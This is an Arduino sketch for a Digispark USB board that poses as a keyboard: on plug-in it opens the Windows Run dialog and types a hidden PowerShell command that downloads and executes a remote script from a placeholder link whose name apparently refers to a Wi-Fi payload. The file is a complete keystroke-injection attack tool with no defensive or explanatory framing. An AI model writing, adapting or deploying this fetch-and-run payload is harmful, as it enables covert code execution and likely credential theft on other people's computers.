

#include "DigiKeyboard.h"

void setup()


{
	
	pinMode(1, OUTPUT);
	
	
  DigiKeyboard.delay(1000);
  
  
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);    
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  
  DigiKeyboard.print(F("powershell -windowstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('YOUR-DOWNLOAD-LINK-WIFI.PS1');\""));
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);


}

void loop() {

   digitalWrite(1, HIGH);
  delay(1000);              
  digitalWrite(1, LOW); 
  delay(1000);   

         
}
